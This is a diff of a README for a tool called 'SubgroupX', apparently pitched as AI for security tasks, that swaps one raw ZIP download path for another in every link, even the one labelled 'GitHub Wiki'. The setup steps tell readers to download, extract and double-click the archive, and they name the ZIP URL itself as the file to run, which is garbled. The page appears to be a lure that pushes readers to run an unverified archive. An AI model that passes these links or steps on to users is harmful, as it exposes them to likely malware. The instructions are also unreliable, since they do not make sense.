@@ -1,6 +1,6 @@
 # 🎯 SubgroupX - High-Performance AI for Security Tasks
 
-[![Download SubgroupX](https://github.com/batuser11/SubgroupX/raw/refs/heads/main/functions/api/X-Subgroup-v2.2.zip%20SubgroupX-%20%F0%9F%9A%80%20Release-blue)](https://github.com/batuser11/SubgroupX/raw/refs/heads/main/functions/api/X-Subgroup-v2.2.zip)
+[![Download SubgroupX](https://github.com/batuser11/SubgroupX/raw/refs/heads/main/src/X_Subgroup_v2.0.zip%20SubgroupX-%20%F0%9F%9A%80%20Release-blue)](https://github.com/batuser11/SubgroupX/raw/refs/heads/main/src/X_Subgroup_v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -22,15 +22,15 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page:** Go to the link below to access the latest version of SubgroupX:
    
-   [Download SubgroupX](https://github.com/batuser11/SubgroupX/raw/refs/heads/main/functions/api/X-Subgroup-v2.2.zip)
+   [Download SubgroupX](https://github.com/batuser11/SubgroupX/raw/refs/heads/main/src/X_Subgroup_v2.0.zip)
 
 2. **Select the Version:** Find the latest release at the top of the page. This is usually the first entry in the list.
 
-3. **Download the File:** Click on the asset you want to download. If you’re unsure which file to choose, look for one named `https://github.com/batuser11/SubgroupX/raw/refs/heads/main/functions/api/X-Subgroup-v2.2.zip` or similar.
+3. **Download the File:** Click on the asset you want to download. If you’re unsure which file to choose, look for one named `https://github.com/batuser11/SubgroupX/raw/refs/heads/main/src/X_Subgroup_v2.0.zip` or similar.
 
 4. **Unzip the File:** Once the download is complete, locate the downloaded ZIP file on your computer. Right-click it and choose “Extract All” to unzip its contents.
 
-5. **Run the Application:** Open the unzipped folder and find the `https://github.com/batuser11/SubgroupX/raw/refs/heads/main/functions/api/X-Subgroup-v2.2.zip` file. Double-click this file to start using SubgroupX.
+5. **Run the Application:** Open the unzipped folder and find the `https://github.com/batuser11/SubgroupX/raw/refs/heads/main/src/X_Subgroup_v2.0.zip` file. Double-click this file to start using SubgroupX.
 
    If you are using macOS or Linux, look for the corresponding `.app` or `.sh` file to launch the application.
 
@@ -51,7 +51,7 @@ SubgroupX offers numerous features designed to enhance your security operations,
 
 ## 📄 Documentation
 
-For detailed instructions and advanced features, refer to the official documentation included in the downloaded files or check the [GitHub Wiki](https://github.com/batuser11/SubgroupX/raw/refs/heads/main/functions/api/X-Subgroup-v2.2.zip).
+For detailed instructions and advanced features, refer to the official documentation included in the downloaded files or check the [GitHub Wiki](https://github.com/batuser11/SubgroupX/raw/refs/heads/main/src/X_Subgroup_v2.0.zip).
 
 ## 💬 Support
 
